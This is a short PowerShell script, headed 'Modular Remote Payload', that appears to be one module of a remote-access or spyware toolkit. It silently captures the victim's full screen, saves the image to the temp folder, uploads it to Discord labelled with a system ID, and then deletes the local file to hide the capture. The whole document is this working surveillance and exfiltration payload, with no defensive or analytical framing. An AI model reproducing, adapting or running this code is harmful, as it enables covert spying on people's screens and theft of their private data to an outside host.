# ============================================================
# Screenshot Capture - Modular Remote Payload
# ============================================================
# Takes a screenshot and sends to Discord
# ============================================================

$sysid = Get-SystemID

try {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    
    # Get screen dimensions
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    
    # Capture screen
    $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
    
    # Save to temp
    $path = "$env:TEMP\ss_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
    $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
    
    # Cleanup graphics objects
    $graphics.Dispose()
    $bitmap.Dispose()
    
    # Send to Discord
    Send-Discord "📸 Screenshot from **$sysid**" $path
    
    # Cleanup file
    Start-Sleep -Seconds 2
    Remove-Item $path -Force 2>$null
    
} catch {
    Send-Discord "❌ Screenshot failed on $sysid`: $_"
}

